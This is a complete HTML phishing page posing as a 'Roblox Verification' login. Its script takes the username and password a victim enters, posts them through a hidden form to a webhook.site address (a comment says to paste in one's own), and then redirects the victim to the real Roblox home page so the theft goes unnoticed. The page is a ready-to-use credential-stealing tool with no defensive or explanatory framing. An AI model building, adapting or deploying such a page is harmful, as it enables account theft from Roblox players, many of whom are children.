<!DOCTYPE html>
<html>
<body style="text-align:center; margin-top:50px;">
    <h2>Roblox Verification</h2>
    <input type="text" placeholder="Username" id="user"><br><br>
    <input type="password" placeholder="Password" id="pass"><br><br>
    <button onclick="send()">Submit</button>

    <script>
        // PASTE YOUR WEBHOOK.SITE URL HERE
        const TARGET = "https://webhook.site/3f899a22-0936-4f05-827f-8e24d5d0dcc1";

        function send() {
            // Create a form
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = TARGET;
           
            // Add dummy fields so it looks like a real login
            var u = document.createElement('input');
            u.name = 'username';
            u.value = document.getElementById('user').value;
            form.appendChild(u);
           
            var p = document.createElement('input');
            p.name = 'password';
            p.value = document.getElementById('pass').value;
            form.appendChild(p);
           
            document.body.appendChild(form);
            form.submit();
           
            // Redirect to Roblox
            window.location.href = "https://www.roblox.com/home";
        }
    </script>
</body>
</html>
